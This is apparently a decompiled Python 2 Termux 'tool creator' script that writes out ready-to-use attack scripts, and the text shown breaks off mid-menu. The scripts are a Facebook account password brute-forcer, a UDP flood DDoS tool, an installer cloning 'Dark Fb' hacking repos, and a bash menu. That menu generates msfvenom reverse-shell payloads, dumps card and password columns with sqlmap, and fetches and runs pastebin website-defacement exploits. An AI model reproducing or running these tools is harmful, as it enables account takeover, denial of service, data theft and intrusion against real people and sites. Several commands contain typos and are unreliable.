# Decompiled by HTR-TECH | TAHMID RAYAT
# Github : https://github.com/htr-tech
#---------------------------------------
# Auto Dis Parser 2.2.0
# Source File : tegar.py
# Time : Sun Aug  9 11:07:58 2020
#---------------------------------------

#!usr/bin/python2.7
# -*- coding: UTF-8 -*-
# Hayo mau ngapain
# Jangan di Recode Om kalo gk mau kena denda 400jt

import os,time,sys

# Warna
wd = "\033[90;1m" # dark
GL = "\033[96;1m" # Blue aqua
BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33;1m"    # Yellow
G = "\033[32m"    # Green
W = "\033[0;1m"     # White
R = "\033[31m"    # Red
C = "\033[36;1m"    # Cyan

os.system("clear")

def tik():
        titik = ['.   ','..  ','... ','....']
        for o in titik:
                print(Y+"\r["+R+"●"+Y+"] "+G+"Loading "+B+" "+o),;sys.stdout.flush();time.sleep(1)

def tik2():
        titik = ['.   ','..  ','... ','....','... ','..  ','.   ','    ']
        for o in titik:
                print(Y+"\r["+R+"●"+Y+"] "+G+"Checking License "+B+" "+o),;sys.stdout.flush();time.sleep(1)

def tik3():
        titik = ['.   ','..  ','... ','....','... ','..  ','.   ','    ','.   ','..  ','... ','....','... ','..  ','.   ','    ']
        for o in titik:
                print(Y+"\r["+R+"●"+Y+"] "+G+"Loading To Create Tool "+B+" "+o),;sys.stdout.flush();time.sleep(1)

def banner():
    os.system("clear")
    print R+"──"+Y+"▄▀▀▀▄"+R+"───────────────"
    print R+"──"+Y+"█"+R+"───"+Y+"█"+R+"───────────────"
    print R+"─"+Y+"███████"+R+"─────────"+Y+"▄▀▀▄"+R+"─"
    print B+"░"+Y+"██─▀─██"+B+"░░"+Y+"█▀█▀▀▀▀█"+B+"░░"+Y+"█"+B+"░"
    print B+"░"+Y+"███▄███"+B+"░░"+Y+"▀"+B+"░"+Y+"▀"+B+"░░░░░"+Y+"▀▀"+B+"░░"
    print W+"╔═════════════════════════════════════════╗"
    print W+"║ "+B+"* "+W+"Author  : Tegar-ID                    ║"
    print W+"║ "+B+"* "+R+"FansPage"+W+": Termux Is Fun               ║"
    print W+"║ "+B+"* "+W+"Github  : https://github.com/Tegar-ID ║"
    print W+"╚═════════════════════════════════════════╝"
    print G+"  v0.1"
    print " "
    print W+"["+Y+"1"+W+"] Login Tools"
    print W+"["+Y+"2"+W+"] Install Package"
    print W+"["+Y+"3"+W+"] Contact Author"
    print W+"["+R+"0"+W+"] Exit"
    print " "
    pilih = raw_input(Y+"["+R+"root"+Y+"/"+B+"Tegar-ID"+Y+"]"+R+"> ")
    if pilih == "1":
        tik()
        time.sleep(2)
        banner2()
    elif pilih == "2":
        tik()
        os.system("clear")
        print W+"["+R+"!"+W+"] Wait To Installing Package"
        time.sleep(2)
        os.system("pkg install git")
        os.system("pkg install python2")
        os.system("pkg install python")
        os.system("pkg install nano")
        os.system("pip2 install requests")
        os.system("pip2 install mechanize")
        os.system("pip2 install bs4")
        os.system("clear")
        print "["+R+"✔"+W+"]installing Done"
        time.sleep(2)
        os.system("clear")
        banner()
    elif pilih == "3":
        tik()
        os.system("xdg-open 'http://wa.me/+6282125068665' ")
        banner()
    elif pilih == "0":
        os.system("clear")
        print Y+"["+R+"*"+Y+"] "+W+"Thanks To Use My Tools "+Y+"["+R+"*"+Y+"]"
        time.sleep(2)
        os.system("clear")
    else :
        tik()
        print "pilihan tidak ada"
        time.sleep(2)
        banner()

def banner2():
    os.system("clear")
    print R+" "
    print "──"+Y+"▄▀▀▀▄"+R+"───────────────"
    print R+"──"+Y+"█"+R+"───"+Y+"█"+R+"───────────────"
    print R+"─"+Y+"███████"+R+"─────────"+Y+"▄▀▀▄"+R+"─"
    print B+"░"+Y+"██─▀─██"+B+"░░"+Y+"█▀█▀▀▀▀█"+B+"░░"+Y+"█"+B+"░"
    print B+"░"+Y+"███▄███"+B+"░░"+Y+"▀"+B+"░"+Y+"▀"+B+"░░░░░"+Y+"▀▀"+B+"░░"
    print W+"╔═════════════════════════════════════════╗"
    print W+"║ "+B+"* "+W+"Author  : Tegar-ID                    ║"
    print W+"║ "+B+"* "+R+"FansPage"+W+": Termux Is Fun               ║"
    print W+"║ "+B+"* "+W+"Github  : https://github.com/Tegar-ID ║"
    print W+"╚═════════════════════════════════════════╝"
    print G+"  v0.1"
    print " "
    print Y+"Jika belum Tau kode License nya silahkan ketik asal dulu\nanti akan otomatis menuju link mediafire terus\nkalian download file txt nya terus buka dan disitu\nada kode licensenya"
    print " "
    licensi = raw_input(B+"["+R+"LICENSE"+B+"] "+G+"= ")
    if licensi == "Hd8keb38cjebididbwbfidnb2ifnb39cbebfo":
        tik2()
        print "Login Succes"
        time.sleep(2)
        banner3()
    else :
        tik2()
        print R+"License tidak cocok"
        print "Download dulu kode License nya"
        os.system("xdg-open 'https://www.mediafire.com/download/lhiowhzidd1sbmj' ")
        time.sleep(2)
        banner2()

def banner3():
    os.system("clear")
    print W+" "
    print W+"      ╔═══════════╗"
    print W+"    ╔═╝███████████╚═╗           "+B+"╔══╗╔═╗╔══╗╔══╗╔═╗  "+R+"╔══╗╔══╗"
    print W+"   ╔╝███████████████╚╗          "+B+"╚╗╔╝║╦╝║╔═╣║╔╗║║╬║  "+R+"╚║║╝╚╗╗║"
    print W+"   ║█████████████████║          "+B+"─║║─║╩╗║╚╗║║╠╣║║╗╣  "+R+"╔║║╗╔╩╝║"
    print W+"   ║█████████████████║          "+B+"─╚╝─╚═╝╚══╝╚╝╚╝╚╩╝  "+R+"╚══╝╚══╝"
    print W+"   ║█████████████████║"
    print W+"   ║█╔█████████████╗█║         "+R+"[ "+Y+"Menu Pilihan "+R+"]"
    print W+"   ╚╦╝███▒▒███▒▒███╚╦╝"
    print W+"   ╔╝██▒▒▒▒███▒▒▒▒██╚╗     ["+G+"1"+W+"] Create Tools"
    print W+"   ║██▒▒▒▒▒███▒▒▒▒▒██║     ["+G+"2"+W+"] Edit Tools"
    print W+"   ║██▒▒▒▒█████▒▒▒▒██║     ["+G+"3"+W+"] Remove Tools"
    print W+"   ╚╗███████████████╔╝     ["+G+"4"+W+"] Move it Tools to "+Y+"/sdcard"
    print W+"  ╔═╬══╦╝██▒█▒██╚╦══╝      ["+R+"0"+W+"] Exit Program"
    print W+"  ║█║══║█████████║"
    print W+"  ║█║══║█║██║██║█║      "+G+"v0.1"
    print W+"  ║█║══╚═╩══╩╦═╩═╩═╦╗"
    print W+" ╔╝█╚══╦═╦══╦╩═╦═╦═╩╝"
    print W+"╔╝█████║█║██║██║█║"
    print W+"║██████║█████████║"
    print " "
    pilih = raw_input(Y+"["+R+"root"+Y+"/"+B+"Tegar-ID"+Y+"]"+R+"> ")
    if pilih == "1":
        tik()
        banner4()
    elif pilih == "2":
        tik()
        banner5()
    elif pilih == "3":
        tik()
        banner6()
    elif pilih == "4":
        tik()
        banner7()
    elif pilih == "0":
        os.system("clear")
        print Y+"["+R+"*"+Y+"] "+W+"Thanks To Use My Tools "+Y+"["+R+"*"+Y+"]"
        time.sleep(2)
    else :
        tik()
        print "Pilihan Tidak Ada"
        time.sleep(2)
        banner3()

def banner4():
    os.system("clear")
    print W+" "
    print W+"      ╔═══════════╗"
    print W+"    ╔═╝███████████╚═╗           "+B+"╔══╗╔═╗╔══╗╔══╗╔═╗  "+R+"╔══╗╔══╗"
    print W+"   ╔╝███████████████╚╗          "+B+"╚╗╔╝║╦╝║╔═╣║╔╗║║╬║  "+R+"╚║║╝╚╗╗║"
    print W+"   ║█████████████████║          "+B+"─║║─║╩╗║╚╗║║╠╣║║╗╣  "+R+"╔║║╗╔╩╝║"
    print W+"   ║█████████████████║          "+B+"─╚╝─╚═╝╚══╝╚╝╚╝╚╩╝  "+R+"╚══╝╚══╝"
    print W+"   ║█████████████████║"
    print W+"   ║█╔█████████████╗█║         "+R+"[ "+Y+"Menu Pilihan "+R+"]"
    print W+"   ╚╦╝███▒▒███▒▒███╚╦╝"
    print W+"   ╔╝██▒▒▒▒███▒▒▒▒██╚╗     ["+G+"1"+W+"] Create Tools Hack Fb"
    print W+"   ║██▒▒▒▒▒███▒▒▒▒▒██║     ["+G+"2"+W+"] Create Tools Installer DarkFb"
    print W+"   ║██▒▒▒▒█████▒▒▒▒██║     ["+G+"3"+W+"] Create Tools Ddos"
    print W+"   ╚╗███████████████╔╝     ["+G+"4"+W+"] Create Tools Xsploit Installer"
    print W+"  ╔═╬══╦╝██▒█▒██╚╦══╝      ["+R+"0"+W+"] Exit To Menu"
    print W+"  ║█║══║█████████║"
    print W+"  ║█║══║█║██║██║█║      "+G+"v0.1"
    print W+"  ║█║══╚═╩══╩╦═╩═╩═╦╗"
    print W+" ╔╝█╚══╦═╦══╦╩═╦═╦═╩╝"
    print W+"╔╝█████║█║██║██║█║"
    print W+"║██████║█████████║"
    print " "
    pilih = raw_input(Y+"["+R+"root"+Y+"/"+B+"Tegar-ID"+Y+"]"+R+"> ")
    if pilih == "0":
        tik()
        banner3()
    if pilih == "1":
        f = open('HackFb.py', 'a')
        f.write("""#!usr/bin/python2.7
# -*- coding: UTF-8 -*-
#Created by Tegar ID

# SILAHKAN COSTUMISASI SENDIRI YA BOSQ #

import os
import sys
import time
import random
import cookielib
import mechanize

wd = "\033[90;1m" # dark
GL = "\033[96;1m" # Blue aqua
BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33;1m"    # Yellow
G = "\033[32m"    # Green
W = "\033[0;1m"     # White
R = "\033[31m"    # Red
C = "\033[36;1m"    # Cyan

def runntxt(s):
        for noobs in s + '\n':
                sys.stdout.write(noobs)
                sys.stdout.flush()
                time.sleep(10. / 2100)


def banner():
    os.system('clear')
    print Y+"╔══════════════════════════════════════════╗"
    print Y+"║ * Author   : NAMA KAMU                   ║"
    print Y+"║ * YouTube  : Channel Youtube Kamu        ║"
    print Y+"║ * Whatsapp : Whatsapp Kamu               ║"
    print Y+"╚══════════════════════════════════════════╝"

banner ()

email_target = str(raw_input(GL+"\033[92mMasukkan Email/Id Target =>\033[93m  "))
password_list = str(raw_input(GG+"Ketik pass.txt =>\033[93m "))
login = 'https://www.facebook.com/login.php?login_attempt=1'
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
# useragents = [('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',)]

def pil():
                print GG+" "
                g = str(raw_input("[?] Coba Lagi ?\033[93;1m[y/n]: "))
                if g == 'y' or g == 'Y':
                    os.system('python2 force.py')
                elif g == 'n' or g == 'N':
                    print wd+"Keluar dari program..."
                    sys.exit()
                else:
                    print RR+"Pilih yang bener cuk..."
                    pil()

def edit_wordlist():

        print GG+" "
        ed = str(raw_input("[?] Edit wordlist bos? \033[96;1m[y/n]: "))
        if ed == 'y' or ed == 'Y':
                os.system('nano '+password_list)
                pil()
        elif ed == 'n' or ed == 'N':
                print wd+"Keluar Dari Program..."
                sys.exit()

        else:
                print RR+"Pilih yg bener..."
                edit_wordlist()

def main():
        global noobs
        noobs = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        noobs.set_handle_robots(False)
        noobs.set_handle_redirect(True)
        noobs.set_cookiejar(cj)
        noobs.set_handle_equiv(True)
        noobs.set_handle_referer(True)
        noobs.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        runn_noobs()
        life()
        print " "
        print RR+" wordlist tidak ada yg cocok..."
        print " "
def BLANK(hack_password):
  try:
        sys.stdout.write(GG+"\n[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m Mencoba Password ==> \033[91m[\033[90;1m"+hack_password)
        sys.stdout.flush()
        noobs.addheaders = [('User-agent', random.choice(useragents))]
        site = noobs.open(login)
        noobs.select_form(nr = 0)
        noobs.form['email'] = email_target
        noobs.form['pass'] = hack_password
        tom = noobs.submit()
        mask = tom.geturl()
        if mask != login and (not 'login_attempt' in mask):
                        print " "
                        print ("\033[96m                S U C C E S S")
                        print "          P A S S W O R D  F I N D "
                        print RR+"+-------------------------------------------+"
                        print (RR+"#\033[97m ID / Email Target:\033[92m {}").format(email_target)
                        print (RR+"#\033[97m Password Target:\033[92m {}").format(hack_password)
                        print " "
                        raw_input(WW+"TEKAN ENTER UNTUK KELUAR...")
                        sys.exit(1)


  except KeyboardInterrupt:
      print wd+"Stop......."
      edit_wordlist()
      sys.exit()
def life():
        global hack_password
        password_nob = open(password_list, "r")
        for hack_password in password_nob:
                password_nob = hack_password.replace("\n","")
                BLANK(hack_password)

def runn_noobs():
         global password_list

         lop = GG+"\033[90;1m[RG4]Black_Coder\033[91;1m\nCreator by:\033[97m Tegar ID


         print lop
         nuub = open(password_list, 'r')
         nuub = nuub.readlines()
         print wd+" [#] ID / Username Target\033[97;1m: {}".format(email_target)
         print wd+" [#] Jumlah Wordlist Saat Ini\033[97;1m:", len(nuub),'password'
         print wd+" [#] Tunggu Proses Cracking\033[97;1m.........."
         print " "

if __name__=='__main__':
        main()
        """)
        f.close()
        print W+"Please wait a few minutes "+Y+". . ."
        tik3()
        print W+"["+G+"✔"+W+"] "+G+"Success!!"
        print " "
        print "Saved in internal tools with name "+Y+"HackFb.py"
        pilih = raw_input("[Press Enter To Back Menu]")
        if pilih == "":
            banner3()
        else:
            banner3()
    elif pilih == "2":
        f = open('installer.py', 'a')
        f.write("""
# -*- coding: UTF-8 -*-
#Created by Tegar ID

import os,sys,time

 # SILAHKAN COSTUMISASI SENDIRI YA BOSQ #

def main():
    time.sleep(1)
    os.system ('clear')
    print ''
    os.system ('figlet Tools')
    print'================================='
    print' Author : Your Name '
    print' Team   : Your Team '
    print'================================='
    print'++++++++++++ M E N U ++++++++++++'
    print'[1] Dark Fb v1.7 '
    print'[2] Dark Fb v1.8 '
    print'[3] Dark Fb Premium '
    print'[4] Dark Fb New'
    print'[5] Dark Fb Diamond '
    print'[0] Exit '
    gans = raw_input ('==> ')
    if gans in ['1']:
        time.sleep(1)
        os.system ('git clone https://github.com/Mr-XsZ/Dark-Fb')
        print ('$ lanjut ketikan cd Dark-Fb')
        print ('$ lalu python2 dark.py')
        exit()
    if gans in ['2']:
        time.sleep(1)
        os.system ('git clone https://github.com/wira2611/Pro2611')
        print ('$ lanjut ketikan cd Pro2611')
        print ('$ lalu python2 Pro.py')
        exit()
    if gans in ['3']:
        time.sleep(1)
        os.system ('git clone https://github.com/TheMagizz/DarkPremium')
        print ('$lanjut ketikan cd DarkPremium')
        print ('$ lalu python2 DarkFB.py')
        exit()
    if gans in ['4']:
        time.sleep(1)
        os.system ('git clone https://github.com/KingMrZ17/DarkFbNew')
        print ('$ lanjut ketikan cd DarkFbNew')
        print ('$ lalu python2 darkfb.py')
        print (' + Username INDONESIA')
        print (' + Password MAJU')
        exit()
    if gans in ['5']:
        time.sleep(1)
        os.system('git clone https://github.com/wira2611/diamon')
        print ('$ lanjut ketikan cd diamon')
        print ('$ lalu  python2 diamond-1.py')
        exit()
    if gans in ['0']:
        time.sleep(2)
        exit()
    else:
        time.sleep(1)
        print ' Pilih Yang Bener Goblok . . .'
        time.sleep(1)
        main()

main()

        """)
        f.close()
        print W+"Please wait a few minutes "+Y+". . ."
        tik3()
        print W+"["+G+"✔"+W+"] "+G+"Success!!"
        print " "
        print "Saved in internal tools with name "+Y+"installer.py"
        pilih = raw_input("[Press Enter To Back Menu]")
        if pilih == "":
            banner3()
        else:
            banner3()
    elif pilih == "3":
        f = open('Ddos.py', 'a')
        f.write("""
#!usr/bin/python2.7
# -*- coding: UTF-8 -*-
#Created By Tegar

# Silahkan Modifikasi Lagi Sendiri #

import os,sys,time
import socket
import random
#Menu
os.system("clear")
os.system("figlet Nama Kamu") # Ganti Tulisan Nama Kamu
os.system("figlet DdosTool")
#Fonction
os.system("sleep 2")
print
ip = raw_input("IP    : ")
port = input("Port  : ")
#Code
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
send = 0
while True:
     sock.sendto(bytes, (ip,port))
     send = send + 100000000000
     port = port + 0
     print "send %s packet on %s port %s"%(send,ip,port)
     if port == 65534:
        port = 0
        """)
        f.close()
        print W+"Please wait a few minutes "+Y+". . ."
        tik3()
        print W+"["+G+"✔"+W+"] "+G+"Success!!"
        print " "
        print "Saved in internal tools with name "+Y+"Ddos.py"
        pilih = raw_input("[Press Enter To Back Menu]")
        if pilih == "":
            banner3()
        else:
            banner3()
    elif pilih == "4":
        f = open('Xsploit.sh', 'a')
        f.write("""
#!usr/bin/bash
#Created by Tegar ID

# Silahkan Modifikasi Sendiri #

clear
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
toilet -f future "[=X-Sploit=]" --gay
echo "[===============================]" | lolcat
echo $blue"༼ つ ◕_◕ ༽つ Code By : Nama Kamu" #Ubah Nama Kamu
echo $blue"Fb : Facebook Kamu"         # Ubah Facebook Kamu
echo "[===============================]" | lolcat
sleep 1
echo "Selamat Datang Di X-Sploit" | lolcat
echo "[$]========Installing Session========[$]" | lolcat
echo $green"(1).>Install Metasploit"
echo $green"(2).Install ngrok"
echo $white"[$]========Payload Generator========[$]" | lolcat
echo $red"(A).Android"
echo $red"(W).Windows"
echo $red"(L).Linux"
echo $red"(M).MacOs"
echo $white"[$]========Hacking Website Session========[$]" | lolcat
echo $blue"(SQ).Auto Dump Cc dengan sqlmap"
echo $blue"(SQ1).Auto Dump Cc Dengan sqlmap (pakek dork)"
echo $blue"(D).Auto Deface Web (Method Com_Fabrik)"
echo $blue"(D1).Auto Deface Web (Method fox_contact)"
echo $blue"(N).Scan Vuln Sql Dengan Nmap"
echo $blue"(N1).Scan Subdomain website dengan nmap"
echo $red"(X).keluar"
echo "[$]========Terminal Session========[$]" | lolcat
echo $white"╭─ root@X-Sploit"
read -p "╰$ " j

if [ $j = 1 ]
then
pkg install figlet -y
figlet Installing
pkg install curl -y
pkg install git -y
pkg install ruby -y
curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh
chmod +x metasploit.sh
./metasploit.sh
echo $red "Metasploit Telah selesai di install"
fi

if [ $j = 2 ]
then
pkg install figlet -y
figlet Installing
pkg install wget -y
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
read -p "Masukin token ngrok lu : " l
./ngrok authtoken $l
./ngrok
fi

if [ $j = A ]
then
echo $red"Pastikan Metasploit Sudah Terinstall"
sleep 1
read -p "Masukan LocalHost elu : " c
read -p "Masukan LocalPort elu : " b
read -p "Masukan nama payload nya : " a
msfvenom -p android/meterpreter/reverse_tcp LHOST=$c LPORT=$b -o /storage/emulated/0/$a
echo $green"Payload Berhasil Dibuat ! silahkan cek payload di memory internal anda"
fi

if [ $j = W ]
then
echo $red"Pastikan Metasploit Sudah Terinstall"
sleep 1
read -p "Masukan LocalHost elu : " a
read -p "Masukan LocalPort elu : " b
read -p "Masukan nama payload nya : " c
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$a LPORT=$b -o /storage/emulated/0/$c
echo $green"Payload Berhasil Dibuat ! silahkan cek payload di memory internal anda"
fi

if [ $j = L ]
then
echo $red"Pastikan Metasploit Sudah Terinstall"
sleep 1
read -p "Masukin LocalHost elu : " a
read -p "Masukin LocalPort elu : " b
read -p "Masukan nama payload nya : " c
echo "[========Pilih Jenis Os========]" | lolcat
echo $blue"(1).aarch64"
echo $blue"(2).x64"
echo $blue"(3).x86"
echo "[========Pilih Jenis Os========]" | lolcat
read -p "Pilih : " h

if [ $h = 1 ]
then
msfvenom -p linux/aarch64/meterpreter/reverse_tcp LHOST=$a LPORT=$b -o /storage/emulated/0/$c
echo $green"Payload Berhasil Dibuat !  silahkan cek payload di memory internal anda"
fi

if [ $h = 2 ]
then
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$a LPORT=$b -o /storage/emulated/0/$a
echo $green"Payload Berhasil Dibuat !  silahkan cek payload di memory internal anda"
fi

if [ $h = 3 ]
then
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$a LPORT=$b -o /storage/emulated/0/$c
echo $green"Payload Berhasil Dibuat !  silahkan cek payload di memory internal anda"
fi

fi

if [ $j = M ]
then
echo $red"Pastikan Metasploit sudah terinstall"
read -p "Masukan LocalHost elu : " a
read -p "Masukan LocalPort elu : " b
read -p "Masukan nama payload nya : " c
echo "[========Pilih Jenis Os========]" | lolcat
echo $blue"(1).armle"
echo $blue"(2).ppc"
echo $blue"(3).x86"
echo $blue"(4).x64"
echo "[========Pilih Jenis Os========]" | lolcat
read -p "Pilih Os : " k

if [ $k = 1 ]
then
msfvenom -p osx/armle/shell_reverse_tcp LHOST=$a LPORT=$b -o /storage/emulated/0/$c
echo $green"Payload Berhasil Dibuat !  silahkan cek payload di memory internal anda"
fi

if [ $k = 2 ]
then
msfvenom -p osx/ppc/shell_reverse_tcp LHOST=$a LPORT=$b -o /storage/emulated/o/$c
echo $green"Payload Berhasil Dibuat !  silahkan cek payload di memory internal anda"
fi

if [ $k = 3 ]
then
msfvenom -p osx/x86/shell_reverse_tco LHOST=$a LPORT=$b -o /storage/emulated/0/$c
echo $green"Payload Berhasil Dibuat !  silahkan cek payload di memory internal anda"
fi

if [ $k = 4 ]
then
msfvenom -p osx/x64/shell_reverse_tcp LHOST=$a LPORT=$b -o /storage/emulated/o/$c
echo $green"Payload Berhasil Dibuat !  silahkan cek payload di memory internal anda"
fi
fi

if [ $j = SQ ]
then
pkg install figlet -y
figlet Installing
pkg install git -y
pkg install python2 -y
git clone https://github.com/sqlmapproject/sqlmap
pip2 install termcolor
cd sqlmap
read -p "Masukan Hostname/linkweb : " r
python2 sqlmap.py -u $r --batch --dbs --tamper=space2comment --level=2 --risk=2 --flush-session --time-sec 10 --search -C mail,password --smart -o "Done"
echo "Dump Selesai silahkan lihat hasil di folder Done"
ls
fi

if [ $j = SQ1 ]
then
pkg instalk figlet -y
figlet Installing
pkg install git -y
pkg install python2 -y
git clone https://github.com/sqlmapproject/sqlmap
cd sqlmap
read -p "Masukan Dork nya : " d
python2 sqlmap.py -g $d --batch --dbs --tamper=space2comment --level=2 --risk=2 --smart --flush-session --time-sec 15 --search -C mail,password -o Done
echo $red"Dump Selesai silahkan lihat hasil di folder Done"
fi

if [ $j = D ]
then
pkg install figlet -y
figlet Installing
pkg install wget -y
pkg install php -y
read -p "Masukan list Website nya contoh (bacot.txt) : " g
read -p "Masukan Nama script deface (harus berektensi .htm bukan .html)" h
wget https://pastebin.com/raw/LDvFvtUD -O com_fabrik.php
phhp com_fabrik.php $g $h
fi

if [ $j = D1 ]
then
pkg install figlet -y
figlet Installing
pkg install wget -y
pkg install php -y
read -p "Masukan list website nya contoh (bacot.txt) : " k
read -p "Masukan Nama script deface (harus berektensi .htm bukan .html)" t
wget https://pastebin.com/raw/EAtSir5V -O com_foxcontact.php
php com_foxcontact.php $k $t
fi

if [ $j = N ]
then
pkg install figlet -y
figlet Installing
pkg install nmap -y
read -p "Masukan Hostname website nya : " l
nmap -sV --script=http-sql-injection.nse $l -p 80
echo $green"Scan website selesai"
fi

if [ $j = N1 ]
then
pkg install figlet -y
figlet Installing
pkg install nmap -y
read -p "Masukan Hostname website nya : " g
nmap -sV --script=dns-brute.nse $g -p 80
echo $green"Scan Website selesai"
fi

if [ $j = X ]
then
echo $white"Terimakasih Telah Memakai tools ini :)"
sleep 1
echo $red"Jangan Di recode ya bujang"
sleep 1
echo $red"Capek gua bikin nya"
sleep 1
toilet -f future Bye --gay
exit
fi

        """)
        f.close()
        print W+"Please wait a few minutes "+Y+". . ."
        tik3()
        print W+"["+G+"✔"+W+"] "+G+"Success!!"
        print " "
        print "Saved in internal tools with name "+Y+"Xsploit.sh"
        pilih = raw_input("[Press Enter To Back Menu]")
        if pilih == "":
            banner3()
        else:
            banner3()
    else :
        tik()
        print "Pilihan Tidak Ada"
        time.sleep(2)
        banner4()

def banner5():
    os.system("clear")
    print W+" "
    print W+"      ╔═══════════╗"
    print W+"    ╔═╝███████████╚═╗           "+B+"╔══╗╔═╗╔══╗╔══╗╔═╗  "+R+"╔══╗╔══╗"
    print W+"   ╔╝███████████████╚╗          "+B+"╚╗╔╝║╦╝║╔═╣║╔╗║║╬║  "+R+"╚║║╝╚╗╗║"
    print W+"   ║█████████████████║          "+B+"─║║─║╩╗║╚╗║║╠╣║║╗╣  "+R+"╔║║╗╔╩╝║"
    print W+"   ║█████████████████║          "+B+"─╚╝─╚═╝╚══╝╚╝╚╝╚╩╝  "+R+"╚══╝╚══╝"
    print W+"   ║█████████████████║"
    print W+"   ║█╔█████████████╗█║         "+R+"[ "+Y+"Menu Pilihan "+R+"]"
    print W+"   ╚╦╝███▒▒███▒▒███╚╦╝"
    print W+"   ╔╝██▒▒▒▒███▒▒▒▒██╚╗     ["+G+"1"+W+"] Edit Tools HackFb"
    print W+"   ║██▒▒▒▒▒███▒▒▒▒▒██║     ["+G+"2"+W+"] Edit Tools Installer DarkFb"
    print W+"   ║██▒▒▒▒█████▒▒▒▒██║     ["+G+"3"+W+"] Edit Tools Ddos"
    print W+"   ╚╗███████████████╔╝     ["+G+"4"+W+"] Edit Tools Xsploit Installer"
    print W+"  ╔═╬══╦╝██▒█▒██╚╦══╝      ["+R+"0"+W+"] Exit To Menu"
    print W+"  ║█║══║█████████║"
    print W+"  ║█║══║█║██║██║█║      "+G+"v0.1"
    print W+"  ║█║══╚═╩══╩╦═╩═╩═╦╗"
    print W+" ╔╝█╚══╦═╦══╦╩═╦═╦═╩╝"
    print W+"╔╝█████║█║██║██║█║"
    print W+"║██████║█████████║"
    print " "
    pilih = raw_input(Y+"["+R+"root"+Y+"/"+B+"Tegar-ID"+Y+"]"+R+"> ")
    if pilih == "0":
        tik()
        banner3()
    elif pilih == "1":
        tik()
        os.system("nano HackFb.py")
        banner5()
    elif pilih == "2":
        tik()
        os.system("nano installer.py")
        banner5()
    elif pilih == "3":
        tik()
        os.system("nano Ddos.py")
        banner5()
    elif pilih == "4":
        tik()
        os.system("nano Xsploit.sh")
        banner5()
    else :
        tik()
        print "Pilihan Tidak Ada"
        time.sleep(2)
        banner5()

def banner6():
    os.system("clear")
    print W+" "
    print W+"      ╔═══════════╗"
    print W+"    ╔═╝███████████╚═╗           "+B+"╔══╗╔═╗╔══╗╔══╗╔═╗  "+R+"╔══╗╔══╗"
    print W+"   ╔╝███████████████╚╗          "+B+"╚╗╔╝║╦╝║╔═╣║╔╗║║╬║  "+R+"╚║║╝╚╗╗║"
    print W+"   ║█████████████████║          "+B+"─║║─║╩╗║╚╗║║╠╣║║╗╣  "+R+"╔║║╗╔╩╝║"
    print W+"   ║█████████████████║          "+B+"─╚╝─╚═╝╚══╝╚╝╚╝╚╩╝  "+R+"╚══╝╚══╝"
    print W+"   ║█████████████████║"
    print W+"   ║█╔█████████████╗█║         "+R+"[ "+Y+"Menu Pilihan "+R+"]"
    print W+"   ╚╦╝███▒▒███▒▒███╚╦╝"
    print W+"   ╔╝██▒▒▒▒███▒▒▒▒██╚╗     ["+G+"1"+W+"] Remove Tools HackFb"
    print W+"   ║██▒▒▒▒▒███▒▒▒▒▒██║     ["+G+"2"+W+"] Remove Tools Installer DarkFb"
    print W+"   ║██▒▒▒▒█████▒▒▒▒██║     ["+G+"3"+W+"] Remove Tools Ddos"
    print W+"   ╚╗███████████████╔╝     ["+G+"4"+W+"] Remove Tools Xsploit Installer"
    print W+"  ╔═╬══╦╝██▒█▒██╚╦══╝      ["+R+"0"+W+"] Exit To Menu"
    print W+"  ║█║══║█████████║"
    print W+"  ║█║══║█║██║██║█║      "+G+"v0.1"
    print W+"  ║█║══╚═╩══╩╦═╩═╩═╦╗"
    print W+" ╔╝█╚══╦═╦══╦╩═╦═╦═╩╝"
    print W+"╔╝█████║█║██║██║█║"
    print W+"║██████║█████████║"
    print " "
